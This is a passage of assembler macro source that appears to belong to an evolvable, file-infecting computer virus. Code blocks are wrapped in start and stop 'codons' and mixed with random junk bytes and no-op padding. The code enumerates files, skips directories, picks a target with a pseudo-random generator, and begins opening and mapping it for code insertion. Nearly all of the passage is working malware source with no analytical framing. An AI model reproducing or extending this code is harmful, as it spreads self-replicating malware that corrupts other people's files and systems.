        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=HGT_FFHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 254
db 128
db 25
db 119
db 150
db 68
db 147
db 124
db 35
db 194
db 64
db 158
db 56
db 243
db 89
db 177
db 157
db 23
db 176
db 233
db 213
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 48
db 95
db 144
db 197
db 155
db 84
db 78
db 40
db 19
db 183
db 124
db 24
db 160
db 60
db 139
db 252
db 188
db 23
db 208
db 7
db 170
db 170
db 21
db 24
db 2
db 220
db 13
db 175
db 234
db 17
db 162
db 134
db 0
db 80
db 249
db 244
db 0
db 163
db 79
db 198
db 229
db 242
db 133
db 95
db 9
db 230
db 131
db 129
db StartCodon
        _getdata
db StopCodon
db 81
db 47
db 211
db 211
db 54
db 254
db 43
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
       _writeDWord                   ; Save FindHandle
       _getEIP
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _saveJmpOff          ; Start of the loop
               ; Calculate the call addresse if the file is not ok
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=((HGTFileEnd1-HGTFileStart1)*8)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 212
db 85
db 2
db 143
db 207
db 138
db 251
db 211
db 71
db 61
db 71
db 218
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 41
db 168
db 14
db 175
db 150
db 55
db 151
db 226
db 113
db 12
db 85
db 167
db 93
db 183
db 67
db 45
db 245
db 235
db 206
db 230
db 20
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
               _getEIP
        HGTFileStart1:
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 150
db 144
db 159
db 58
db 222
db 84
db 10
db 203
db 120
db 200
db 224
db 4
db 13
db 139
db 157
db 250
db 120
db 110
db 76
db 67
db 133
db StartCodon
        _save
        _and
        _popall
    end if
               _addsaved
               _push                                ; Save Addresse on Stack
    _getDO
    BigNum=HGTFileHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 85
db 60
db 180
db 249
db 39
db 166
db 135
db 0
db 140
db 55
db 94
db 156
db 25
db 189
db 106
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                                                       ; be Closed later in any case,
                                                       ; except for [Handle]==0x0
               _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _writeDWord
    _getDO
    BigNum=HGTMapHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 99
db 36
db 237
db 177
db 73
db 236
db 253
db 11
db 251
db 121
db 81
db 118
db 40
db 243
db 201
db 234
db 25
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 177
db 80
db 57
db 86
db 15
db 43
db 22
db 126
db 48
db 60
db 237
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _saveWrtOff
_save           ; BC2=BC1
db StopCodon
db 121
db 249
db 95
db 186
db 228
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
               _writeDWord
    _getDO
    BigNum=HGTDidInsert-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 61
db 118
db 184
db 112
db 157
db 210
db 140
db 63
db StartCodon
        _save
        _and
        _popall
    end if
               _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 179
db 3
db 135
db 194
db 113
db 139
db 98
db 75
db 122
db 40
db 149
db 139
db 235
db 222
db 228
db 252
db 15
db 109
db 173
db 248
db 88
db 136
db 7
db 195
db 118
db 134
db 144
db 147
db 113
db 184
db 43
db 193
db 40
db 107
db 182
db 112
db 133
db StartCodon
               _sub0001
               _writeDWord
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=FILE_ATTRIBUTE_DIRECTORY
    AlreadyStarted=0
db StopCodon
db 255
db 247
db 193
db 169
db 172
db 28
db 179
db 212
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
    _getDO
    BigNum=WIN32_FIND_DATA_dwFileAttributes-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 188
db 62
db 191
db 108
db 16
db 49
db 44
db 230
db 250
db 19
db 103
db 176
db 79
db 215
db 233
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
               _JnzDown                             ; Simulate a JzDown
                       _pop     ; BC1=0
                       _push
                       _call    ; If directory -> Do not open...
                       _nopREAL
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 35
db 222
db 41
db 106
db 17
db 186
db 238
db 190
db 255
db 200
db 204
db 63
db 61
db 203
db 77
db 94
db 93
db 234
db 121
db 147
db 151
db 174
db 30
db 185
db 148
db 201
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 114
db 69
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
db StopCodon
db 246
db 40
db 156
db 87
db 76
db 121
db 4
db 102
db 170
db 181
db 43
db StartCodon
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 59
db 121
db 231
db 52
db 242
db 215
db 45
db 64
db 138
db 240
db 164
db 186
db 66
db 103
db 255
db 161
db 134
db 62
db 95
db 223
db 246
db 71
db 217
db 207
db 182
db 37
db 143
db 182
db 146
db 117
db 127
db 144
db 232
db 173
db 136
db 78
db 245
db 120
db 18
db 122
db 27
db 186
db 45
db 249
db 123
db 194
db 136
db 225
db 178
db 68
db 196
db 162
db 237
db 14
db 220
db 103
db 101
db 168
db 193
db 210
db 12
db 130
db 136
db 154
db 128
db 16
db 181
db 179
db 200
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 84
db 5
db 160
db 193
db 114
db 92
db 117
db 255
db 57
db 89
db 241
db 193
db 75
db 201
db 205
db 6
db 56
db 181
db 185
db 106
db 183
db 95
db 27
db 150
db 119
db 104
db 111
db 80
db 222
db 108
db 3
db 51
db 48
db 135
db 159
db 118
db 181
db 35
db 141
db 119
db 157
db 96
db 12
db 136
db 246
db 208
db 247
db 31
db 151
db 56
db 90
db 61
db 90
db 165
db 71
db 156
db 77
db 221
db 220
db 188
db 33
db 125
db 231
db 16
db 0
db 65
db 31
db 52
db 244
db 124
db 102
db 101
db 110
db 165
db 114
db 161
db 168
db 252
db 205
db 216
db 60
db 104
db 126
db 75
db 89
db 223
db 115
db 214
db 142
db 220
db 221
db 166
db 225
db 78
db 204
db 99
db 40
db 31
db 211
db 176
db 238
db 236
db 110
db 185
db 228
db 33
db 245
db 197
db 205
db 82
db 38
db 223
db 76
db 162
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 9
db 44
db 184
db 137
db 25
db 64
db 70
db 9
db 20
db 48
db 76
db 140
db 137
db 118
db 184
db 0
db 134
db 226
db 106
db 30
db 3
db 189
db 210
db 156
db 63
db 23
db 116
db 18
db 7
db 156
db 19
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
_nopREAL
_nopREAL
_nopREAL
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    if BigNum<25
db StopCodon
db 213
db 51
db 165
db 210
db 151
db 240
db 78
db 173
db 134
db 253
db 162
db 109
db 112
db 161
db 168
db 24
db 189
db 252
db 102
db 146
db 175
db 68
db 29
db 141
db 28
db 141
db 82
db 125
db 164
db 255
db 97
db 119
db 148
db 100
db 201
db 54
db 219
db 135
db 154
db 244
db 241
db 233
db 238
db 24
db 95
db 53
db 143
db 236
db 192
db 167
db 105
db 56
db 55
db 75
db 71
db 43
db 201
db 71
db 146
db 181
db 108
db 9
db 241
db 93
db 35
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 153
db 243
db 87
db 147
db 201
db 105
db 140
db 91
db 24
db 6
db 159
db 116
db 65
db 135
db 126
db 157
db 170
db 7
db 210
db 181
db 240
db 81
db 10
db 196
db 35
db 42
db 36
db 155
db 187
db 45
db 55
db 61
db 149
db 94
db 224
db 67
db 8
db 48
db 241
db 210
db 9
db 58
db 88
db 144
db 85
db 129
db 191
db 232
db 122
db 130
db 169
db 119
db 164
db 71
db 219
db 183
db 237
db 47
db 243
db 218
db 182
db 127
db 42
db 47
db 208
db 235
db 82
db 57
db 132
db 69
db 39
db 146
db 14
db 193
db 23
db 192
db 72
db 248
db 170
db 61
db 16
db 92
db 140
db 156
db 131
db 54
db 24
db 173
db 120
db 144
db 226
db 211
db 102
db 66
db 27
db 218
db 52
db 135
db 65
db 30
db 250
db 239
db 185
db 125
db 111
db 120
db 238
db 111
db 38
db 83
db 24
db 107
db 96
db 181
db 125
db 107
db 204
db 228
db 160
db 54
db 89
db 5
db 210
db 15
db 74
db 219
db 101
db StartCodon
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db StartCodon
        _save
        _and
        _popall
    end if
               _getdata
               _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _nopdD
    BigNum=5
    AlreadyStarted=0
db StopCodon
db 2
db 192
db 101
db 196
db 141
db 47
db 167
db 160
db 118
db 84
db 115
db 84
db 184
db 192
db 31
db 108
db 84
db 138
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _div
               _nopsD
               _save
               _and
_nopREAL
_nopREAL
_nopREAL
               _JnzDown                             ; Simulate a JzDown
                       _nopREAL   ; BC=0
                       _nopREAL
                       _add0001
                       _JnzDown
                               _pop     ; BC!=0
                               _push
                               _call    ; Not this file...
                               _nopREAL
               ; OPEN FILE NOW
db StopCodon
db 178
db 30
db 35
db 250
